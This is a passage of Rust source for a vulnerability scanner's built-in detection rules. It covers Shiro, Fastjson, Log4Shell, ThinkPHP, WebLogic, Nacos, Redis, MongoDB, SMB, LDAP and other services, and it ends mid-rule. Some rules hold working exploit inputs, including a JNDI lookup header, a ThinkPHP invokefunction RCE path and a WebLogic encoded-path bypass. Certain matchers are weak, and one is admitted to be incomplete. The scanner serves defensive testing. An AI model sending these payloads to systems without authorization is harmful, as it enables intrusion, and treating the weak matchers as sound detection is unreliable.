//! 内置 PoC 规则数据库
//!
//! 包含约 30 条预编译的常见内网漏洞检测规则
//! 覆盖 Web 漏洞、TCP 协议未授权、内网服务检测等

use crate::vuln::poc::*;
use std::collections::HashMap;

/// 获取所有内置 PoC 规则
pub fn get_builtin_pocs() -> Vec<PoCRule> {
    vec![
        // === 反序列化 ===
        shiro_550_detect(),
        fastjson_detect(),
        log4shell_detect(),
        // === 未授权访问 ===
        nacos_unauth(),
        jenkins_unauth(),
        elasticsearch_unauth(),
        harbor_unauth(),
        spring_boot_actuator(),
        // === OA 系统 ===
        weaver_oa_detect(),
        zhiyuan_oa_detect(),
        tongda_oa_detect(),
        lanling_oa_detect(),
        // === RCE / 高危 ===
        weblogic_unauth(),
        thinkphp_rce(),
        phpmyadmin_setup(),
        // === TCP 协议 (内网高频) ===
        redis_unauth(),
        mongodb_unauth(),
        ftp_anonymous(),
        smb_null_session(),
        ldap_null_bind(),
        mssql_blank_sa(),
        memcached_unauth(),
        zookeeper_unauth(),
        docker_api_unauth(),
        mysql_blank_root(),
        // === 内网服务检测 ===
        smb_signing_disabled(),
        rdp_open(),
        winrm_open(),
        // === 信息泄露 ===
        git_exposure(),
        env_file_exposure(),
        druid_unauth(),
    ]
}

/// 按严重性和类别过滤内置 PoC
pub fn filter_builtin_pocs(severity: Option<Severity>, category: Option<&str>) -> Vec<PoCRule> {
    get_builtin_pocs()
        .into_iter()
        .filter(|poc| {
            if let Some(sev) = severity {
                if poc.info.severity != sev {
                    return false;
                }
            }
            if let Some(cat) = category {
                if !poc.info.category.contains(cat) && !poc.info.name.contains(cat) {
                    return false;
                }
            }
            true
        })
        .collect()
}

// ============================================================
// 反序列化
// ============================================================

fn shiro_550_detect() -> PoCRule {
    let mut headers = HashMap::new();
    headers.insert("Cookie".to_string(), "rememberMe=test_value".to_string());

    PoCRule {
        id: "shiro-550-detect".to_string(),
        info: PoCInfo {
            name: "Apache Shiro 反序列化检测".to_string(),
            severity: Severity::High,
            category: "反序列化".to_string(),
            description: "通过rememberMe Cookie检测Shiro框架，可能存在默认密钥反序列化漏洞"
                .to_string(),
            tags: vec!["shiro".to_string(), "deserialization".to_string()],
            remediation: "升级Shiro至最新版本，更换默认密钥".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/".to_string(),
            headers,
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Word,
                part: "header".to_string(),
                words: vec!["rememberMe=deleteMe".to_string()],
                regex: vec![],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
            extractors: vec![],
        }],
        script: None,
    }
}

fn fastjson_detect() -> PoCRule {
    let mut headers = HashMap::new();
    headers.insert("Content-Type".to_string(), "application/json".to_string());

    PoCRule {
        id: "fastjson-detect".to_string(),
        info: PoCInfo {
            name: "Fastjson 反序列化检测".to_string(),
            severity: Severity::High,
            category: "反序列化".to_string(),
            description: "检测Fastjson JSON反序列化漏洞".to_string(),
            tags: vec!["fastjson".to_string(), "deserialization".to_string()],
            remediation: "升级Fastjson到1.2.83+或2.x版本，启用safeMode".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "POST".to_string(),
            path: "/".to_string(),
            headers,
            body: Some(r#"{"@type":"java.net.Inet4Address","val":"dns.test.com"}"#.to_string()),
            data: None,
            read_size: None,
            matchers_condition: "or".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["autoType".to_string(), "safeMode".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                // 匹配 Fastjson 特有的错误信息，而非泛化的 HTTP 500
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec![
                        "com.alibaba.fastjson".to_string(),
                        "fastjson".to_string(),
                        "JSONException".to_string(),
                    ],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
            ],
            extractors: vec![],
        }],
        script: None,
    }
}

fn log4shell_detect() -> PoCRule {
    let mut headers = HashMap::new();
    headers.insert(
        "X-Api-Version".to_string(),
        "${jndi:ldap://test.log4j}".to_string(),
    );

    PoCRule {
        id: "log4shell-detect".to_string(),
        info: PoCInfo {
            name: "Log4Shell (CVE-2021-44228) 检测".to_string(),
            severity: Severity::Critical,
            category: "反序列化".to_string(),
            description: "检测Apache Log4j JNDI注入漏洞".to_string(),
            tags: vec!["log4j".to_string(), "jndi".to_string()],
            remediation: "升级Log4j到2.17.1+版本".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/".to_string(),
            headers,
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "or".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Regex,
                part: "body".to_string(),
                words: vec![],
                regex: vec![r"(?i)log4j".to_string()],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
            extractors: vec![],
        }],
        script: None,
    }
}

// ============================================================
// 未授权访问
// ============================================================

fn nacos_unauth() -> PoCRule {
    PoCRule {
        id: "nacos-unauth".to_string(),
        info: PoCInfo {
            name: "Nacos 未授权访问".to_string(),
            severity: Severity::Critical,
            category: "未授权".to_string(),
            description: "Nacos配置中心未授权访问，可获取配置信息".to_string(),
            tags: vec!["nacos".to_string()],
            remediation: "启用Nacos认证，设置正确的鉴权配置".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/nacos/v1/auth/users?pageNo=1&pageSize=9".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["username".to_string(), "password".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
            extractors: vec![],
        }],
        script: None,
    }
}

fn jenkins_unauth() -> PoCRule {
    PoCRule {
        id: "jenkins-unauth".to_string(),
        info: PoCInfo {
            name: "Jenkins 未授权访问".to_string(),
            severity: Severity::Critical,
            category: "未授权".to_string(),
            description: "Jenkins控制台未授权访问".to_string(),
            tags: vec!["jenkins".to_string()],
            remediation: "启用Jenkins安全配置，设置认证".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/script".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["Groovy".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
            extractors: vec![],
        }],
        script: None,
    }
}

fn elasticsearch_unauth() -> PoCRule {
    PoCRule {
        id: "elasticsearch-unauth".to_string(),
        info: PoCInfo {
            name: "Elasticsearch 未授权访问".to_string(),
            severity: Severity::Critical,
            category: "未授权".to_string(),
            description: "Elasticsearch API未授权访问".to_string(),
            tags: vec!["elasticsearch".to_string()],
            remediation: "在elasticsearch.yml中启用x-pack安全配置".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/_cat/indices".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["green".to_string(), "yellow".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
            extractors: vec![],
        }],
        script: None,
    }
}

fn harbor_unauth() -> PoCRule {
    PoCRule {
        id: "harbor-unauth".to_string(),
        info: PoCInfo {
            name: "Harbor 未授权访问".to_string(),
            severity: Severity::High,
            category: "未授权".to_string(),
            description: "Harbor镜像仓库未授权访问".to_string(),
            tags: vec!["harbor".to_string(), "docker".to_string()],
            remediation: "启用Harbor认证配置".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/api/v2.0/projects".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["project_id".to_string(), "repo_count".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
            extractors: vec![],
        }],
        script: None,
    }
}

fn spring_boot_actuator() -> PoCRule {
    PoCRule {
        id: "spring-boot-actuator".to_string(),
        info: PoCInfo {
            name: "Spring Boot Actuator 端点泄露".to_string(),
            severity: Severity::High,
            category: "信息泄露".to_string(),
            description: "Spring Boot Actuator敏感端点暴露".to_string(),
            tags: vec!["spring".to_string(), "actuator".to_string()],
            remediation: "限制Actuator端点暴露，配置management.endpoints.web.exposure.exclude"
                .to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/actuator/env".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["activeProfiles".to_string(), "propertySources".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
            extractors: vec![],
        }],
        script: None,
    }
}

// ============================================================
// OA 系统
// ============================================================

fn weaver_oa_detect() -> PoCRule {
    PoCRule {
        id: "weaver-oa-info".to_string(),
        info: PoCInfo {
            name: "泛微OA 信息泄露".to_string(),
            severity: Severity::High,
            category: "OA系统".to_string(),
            description: "泛微OA系统敏感信息泄露".to_string(),
            tags: vec!["weaver".to_string(), "oa".to_string()],
            remediation: "升级泛微OA至最新安全补丁".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/api/hrm/resource/read".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "or".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Word,
                part: "all".to_string(),
                words: vec!["weaver".to_string(), "ecology".to_string()],
                regex: vec![],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
            extractors: vec![],
        }],
        script: None,
    }
}

fn zhiyuan_oa_detect() -> PoCRule {
    PoCRule {
        id: "zhiyuan-oa-info".to_string(),
        info: PoCInfo {
            name: "致远OA 状态监控页面泄露".to_string(),
            severity: Severity::Medium,
            category: "OA系统".to_string(),
            description: "致远OA状态监控页面暴露内部信息".to_string(),
            tags: vec!["seeyon".to_string(), "oa".to_string()],
            remediation: "关闭状态监控页面，限制外部访问".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/seeyon/main.do".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Word,
                part: "all".to_string(),
                words: vec!["seeyon".to_string()],
                regex: vec![],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
            extractors: vec![],
        }],
        script: None,
    }
}

fn tongda_oa_detect() -> PoCRule {
    PoCRule {
        id: "tongda-oa-info".to_string(),
        info: PoCInfo {
            name: "通达OA 信息检测".to_string(),
            severity: Severity::Medium,
            category: "OA系统".to_string(),
            description: "通达OA系统信息泄露检测".to_string(),
            tags: vec!["tongda".to_string(), "oa".to_string()],
            remediation: "升级通达OA至最新版本".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/inc/expired.php".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Word,
                part: "all".to_string(),
                words: vec!["tongda".to_string(), "OA".to_string()],
                regex: vec![],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
            extractors: vec![],
        }],
        script: None,
    }
}

fn lanling_oa_detect() -> PoCRule {
    PoCRule {
        id: "lanling-oa-info".to_string(),
        info: PoCInfo {
            name: "蓝凌OA 信息检测".to_string(),
            severity: Severity::Medium,
            category: "OA系统".to_string(),
            description: "蓝凌OA系统信息泄露检测".to_string(),
            tags: vec!["landray".to_string(), "oa".to_string()],
            remediation: "升级蓝凌OA至最新安全版本".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/admin.do".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Word,
                part: "all".to_string(),
                words: vec!["landray".to_string(), "ekp".to_string()],
                regex: vec![],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
            extractors: vec![],
        }],
        script: None,
    }
}

// ============================================================
// RCE / 高危漏洞
// ============================================================

fn weblogic_unauth() -> PoCRule {
    PoCRule {
        id: "weblogic-cve2020-14882".to_string(),
        info: PoCInfo {
            name: "WebLogic 未授权访问 (CVE-2020-14882)".to_string(),
            severity: Severity::Critical,
            category: "RCE".to_string(),
            description: "WebLogic控制台未授权访问漏洞".to_string(),
            tags: vec!["weblogic".to_string(), "cve-2020-14882".to_string()],
            remediation: "安装Oracle关键补丁更新".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/console/css/%252e%252e/consolejndi.portal".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["consolejndi".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
            ],
            extractors: vec![],
        }],
        script: None,
    }
}

fn thinkphp_rce() -> PoCRule {
    PoCRule {
        id: "thinkphp-rce".to_string(),
        info: PoCInfo {
            name: "ThinkPHP 5.x RCE".to_string(),
            severity: Severity::Critical,
            category: "RCE".to_string(),
            description: "ThinkPHP 5.x 远程代码执行漏洞".to_string(),
            tags: vec!["thinkphp".to_string(), "rce".to_string()],
            remediation: "升级ThinkPHP至最新安全版本".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["PHP Version".to_string(), "phpinfo".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
            extractors: vec![],
        }],
        script: None,
    }
}

fn phpmyadmin_setup() -> PoCRule {
    PoCRule {
        id: "phpmyadmin-setup".to_string(),
        info: PoCInfo {
            name: "phpMyAdmin Setup 脚本暴露".to_string(),
            severity: Severity::High,
            category: "信息泄露".to_string(),
            description: "phpMyAdmin setup脚本未删除，可能被利用".to_string(),
            tags: vec!["phpmyadmin".to_string()],
            remediation: "删除setup目录，限制phpMyAdmin访问".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/setup/index.php".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["phpMyAdmin".to_string(), "setup".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
            extractors: vec![],
        }],
        script: None,
    }
}

// ============================================================
// TCP 协议
// ============================================================

fn redis_unauth() -> PoCRule {
    PoCRule {
        id: "redis-unauth".to_string(),
        info: PoCInfo {
            name: "Redis 未授权访问".to_string(),
            severity: Severity::Critical,
            category: "未授权".to_string(),
            description: "Redis服务无密码保护，可直接连接".to_string(),
            tags: vec!["redis".to_string()],
            remediation: "设置Redis密码认证(requirepass)，禁止外部访问".to_string(),
        },
        transport: Transport::Tcp,
        default_port: Some(6379),
        rules: vec![PoCRequest {
            method: String::new(),
            path: String::new(),
            headers: HashMap::new(),
            body: None,
            data: Some("INFO\r\n".to_string()),
            read_size: Some(4096),
            matchers_condition: "and".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Word,
                part: String::new(),
                words: vec!["redis_version".to_string()],
                regex: vec![],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
            extractors: vec![],
        }],
        script: None,
    }
}

fn mongodb_unauth() -> PoCRule {
    PoCRule {
        id: "mongodb-unauth".to_string(),
        info: PoCInfo {
            name: "MongoDB 未授权访问".to_string(),
            severity: Severity::Critical,
            category: "未授权".to_string(),
            description: "MongoDB无认证，可直接访问数据库".to_string(),
            tags: vec!["mongodb".to_string()],
            remediation: "启用MongoDB认证(--auth)，限制网络访问".to_string(),
        },
        transport: Transport::Tcp,
        default_port: Some(27017),
        rules: vec![PoCRequest {
            method: String::new(),
            path: String::new(),
            headers: HashMap::new(),
            body: None,
            data: Some(bson_list_databases()),
            read_size: Some(4096),
            matchers_condition: "and".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Word,
                part: String::new(),
                words: vec!["totalSize".to_string(), "databases".to_string()],
                regex: vec![],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
            extractors: vec![],
        }],
        script: None,
    }
}

/// MongoDB listDatabases 命令 (BSON编码)
fn bson_list_databases() -> String {
    // 简化: 使用原始BSON字节发送 listDatabases 命令
    // 实际BSON: {listDatabases: 1}
    let bson_bytes: Vec<u8> = vec![
        0x29, 0x00, 0x00, 0x00, // document length (41 bytes)
        0x01, // type: double
        0x6C, 0x69, 0x73, 0x74, 0x44, 0x61, 0x74, 0x61, 0x62, 0x61, 0x73, 0x65, 0x73,
        0x00, // "listDatabases\0"
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 1.0 as double
        0x00, // end
    ];
    // OP_MSG header (simplified): flags + section + payload
    let mut msg = Vec::new();
    // OP_MSG header
    msg.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // flags
    msg.push(0x00); // section kind: body
    msg.extend_from_slice(&bson_bytes);

    // Wire protocol header
    let total_len = (16 + msg.len()) as i32;
    let mut wire = Vec::new();
    wire.extend_from_slice(&total_len.to_le_bytes()); // message length
    wire.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // requestID
    wire.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // responseTo
    wire.extend_from_slice(&[0xDD, 0x07, 0x00, 0x00]); // opCode: OP_MSG (2013)
    wire.extend_from_slice(&msg);

    String::from_utf8_lossy(&wire).to_string()
}

// ============================================================
// 信息泄露
// ============================================================

fn git_exposure() -> PoCRule {
    PoCRule {
        id: "git-exposure".to_string(),
        info: PoCInfo {
            name: ".git 目录泄露".to_string(),
            severity: Severity::High,
            category: "信息泄露".to_string(),
            description: ".git目录暴露，可能导致源代码泄露".to_string(),
            tags: vec!["git".to_string()],
            remediation: "删除Web目录下的.git目录，配置Web服务器拒绝访问".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/.git/HEAD".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["ref: refs/".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
            extractors: vec![],
        }],
        script: None,
    }
}

fn env_file_exposure() -> PoCRule {
    PoCRule {
        id: "env-file-exposure".to_string(),
        info: PoCInfo {
            name: ".env 文件泄露".to_string(),
            severity: Severity::Critical,
            category: "信息泄露".to_string(),
            description: ".env配置文件暴露，可能包含数据库密码、API密钥等".to_string(),
            tags: vec!["env".to_string(), "config".to_string()],
            remediation: "禁止Web服务器访问.env文件".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/.env".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["DB_".to_string(), "APP_".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
            extractors: vec![],
        }],
        script: None,
    }
}

fn druid_unauth() -> PoCRule {
    PoCRule {
        id: "druid-unauth".to_string(),
        info: PoCInfo {
            name: "Druid 监控未授权访问".to_string(),
            severity: Severity::Medium,
            category: "信息泄露".to_string(),
            description: "Druid监控页面未授权访问，泄露数据库信息".to_string(),
            tags: vec!["druid".to_string()],
            remediation: "配置Druid监控页面的访问认证".to_string(),
        },
        transport: Transport::Http,
        default_port: None,
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/druid/index.html".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["Druid".to_string(), "StatIndex".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
            extractors: vec![],
        }],
        script: None,
    }
}

// ============================================================
// 内网协议 PoC
// ============================================================

fn ftp_anonymous() -> PoCRule {
    PoCRule {
        id: "ftp-anonymous".to_string(),
        info: PoCInfo {
            name: "FTP 匿名登录".to_string(),
            severity: Severity::High,
            category: "未授权".to_string(),
            description: "FTP 服务允许匿名登录，可下载文件".to_string(),
            tags: vec!["ftp".to_string()],
            remediation: "禁用匿名登录或限制匿名用户权限".to_string(),
        },
        transport: Transport::Tcp,
        default_port: Some(21),
        rules: vec![PoCRequest {
            method: String::new(),
            path: String::new(),
            headers: HashMap::new(),
            body: None,
            data: Some("USER anonymous\r\nPASS anonymous@\r\n".to_string()),
            read_size: Some(4096),
            matchers_condition: "and".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Word,
                part: String::new(),
                words: vec!["230".to_string(), "Login successful".to_string()],
                regex: vec![],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
            extractors: vec![],
        }],
        script: None,
    }
}

fn smb_null_session() -> PoCRule {
    // SMB 空会话检测: 发送 negotiate 请求，检查 SMB 响应
    PoCRule {
        id: "smb-null-session".to_string(),
        info: PoCInfo {
            name: "SMB 空会话检测".to_string(),
            severity: Severity::High,
            category: "未授权".to_string(),
            description: "SMB 服务允许空会话连接，可枚举共享和用户".to_string(),
            tags: vec!["smb".to_string(), "null-session".to_string()],
            remediation: "限制 SMB 空会话访问".to_string(),
        },
        transport: Transport::Tcp,
        default_port: Some(445),
        rules: vec![PoCRequest {
            method: String::new(),
            path: String::new(),
            headers: HashMap::new(),
            body: None,
            data: Some(smb_negotiate_packet()),
            read_size: Some(4096),
            matchers_condition: "and".to_string(),
            // NOTE: 仅检查 Negotiate 响应无法确认空会话是否真正建立。
            // 完整修复需要: 发送 Session Setup AndX (空用户名/密码)，
            // 检查响应 Status = STATUS_SUCCESS (0x00000000) 且 UID 非零，
            // 然后尝试 Tree Connect IPC$ 验证空会话可枚举共享。
            // 目前收紧为匹配 SMB1 Negotiate 响应 (\xffSMB + Command 0x72)，
            // 至少确认目标响应了 Negotiate 而非任意 SMB 数据包。
            matchers: vec![Matcher {
                matcher_type: MatcherType::Binary,
                part: String::new(),
                words: vec![],
                regex: vec![],
                status: vec![],
                // \xffSMB + Command 0x72 (Negotiate) = SMB1 Negotiate 响应
                binary: vec!["ff534d4272".to_string()],
                negative: false,
            }],
            extractors: vec![],
        }],
        script: None,
    }
}

/// SMB Negotiate Protocol Request (简化版)
fn smb_negotiate_packet() -> String {
    let packet: Vec<u8> = vec![
        // NetBIOS Session Service header
        0x00, 0x00, 0x00, 0x85, // length = 133
        // SMB Command: Negotiate
        0xFF, 0x53, 0x4D, 0x42, // \xffSMB
        0x72, // Command: Negotiate
        0x00, 0x00, 0x00, 0x00, // Status
        0x18, // Flags
        0x01, 0x28, // Flags2
        0x00, 0x00, // PID High
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Signature
        0x00, 0x00, // Reserved
        0x00, 0x00, // TID
        0x00, 0x00, // PID
        0x00, 0x00, // UID
        0x00, 0x00, // MID
        // Negotiate request
        0x00, // WordCount
        0x62, 0x00, // ByteCount
        // Dialect strings
        0x02, // Dialect marker
        b'N', b'T', b' ', b'L', b'M', b' ', b'0', b'.', b'1', b'2', 0x00, 0x02, b'S', b'M', b'B',
        b' ', b'1', b'.', b'0', b'0', b'0', 0x00, 0x02, b'S', b'M', b'B', b' ', b'1', b'.', b'0',
        b'2', b'0', 0x00, 0x02, b'S', b'M', b'B', b' ', b'1', b'.', b'2', b'1', b'0', 0x00, 0x02,
        b'S', b'M', b'B', b' ', b'1', b'.', b'3', b'1', b'2', 0x00, 0x02, b'S', b'M', b'B', b' ',
        b'2', b'.', b'0', b'0', b'2', 0x00, 0x02, b'S', b'M', b'B', b' ', b'2', b'.', b'?', b'?',
        b'?', 0x00,
    ];
    String::from_utf8_lossy(&packet).to_string()
}

fn ldap_null_bind() -> PoCRule {
    PoCRule {
        id: "ldap-null-bind".to_string(),
        info: PoCInfo {
            name: "LDAP 匿名绑定".to_string(),
            severity: Severity::High,
            category: "未授权".to_string(),
            description: "LDAP 服务允许匿名绑定，可枚举域用户和组".to_string(),
            tags: vec!["ldap".to_string(), "ad".to_string()],
            remediation: "限制 LDAP 匿名访问".to_string(),
        },
        transport: Transport::Tcp,
        default_port: Some(389),
        rules: vec![PoCRequest {
            method: String::new(),
            path: String::new(),
            headers: HashMap::new(),
            body: None,
            data: Some(ldap_bind_request()),
            read_size: Some(4096),
            matchers_condition: "and".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Binary,
                part: String::new(),
                words: vec![],
                regex: vec![],
                status: vec![],
                // LDAP bindResponse with success (resultCode = 0)
                // 30 0C 02 01 01 61 07 0A 01 00 04 00 04 00
                binary: vec!["0a0100".to_string()], // resultCode = success in bindResponse
                negative: false,
            }],
            extractors: vec![],
        }],
        script: None,
    }
}

/// LDAP BindRequest (匿名绑定, messageID=1)
fn ldap_bind_request() -> String {
    // LDAPMessage ::= SEQUENCE { messageID INTEGER, protocolOp CHOICE { bindRequest [APPLICATION 0] } }
    // BindRequest ::= SEQUENCE { version INTEGER(3), name OCTET STRING(""), authentication CHOICE { simple [0] "" } }
    // DER encoding:
    // 30 = SEQUENCE tag
    let packet: Vec<u8> = vec![
        0x30, 0x0C, // SEQUENCE, length 12
        0x02, 0x01, 0x01, // messageID = 1
        0x60, 0x07, // bindRequest [APPLICATION 0], length 7
        0x02, 0x01, 0x03, // version = 3
        0x04, 0x00, // name = "" (empty = anonymous)
        0x80, 0x00, // simple authentication = "" (empty)
    ];
    String::from_utf8_lossy(&packet).to_string()
}

fn mssql_blank_sa() -> PoCRule {
    PoCRule {
        id: "mssql-blank-sa".to_string(),
        info: PoCInfo {
            name: "MSSQL SA 空密码检测".to_string(),
            severity: Severity::Critical,
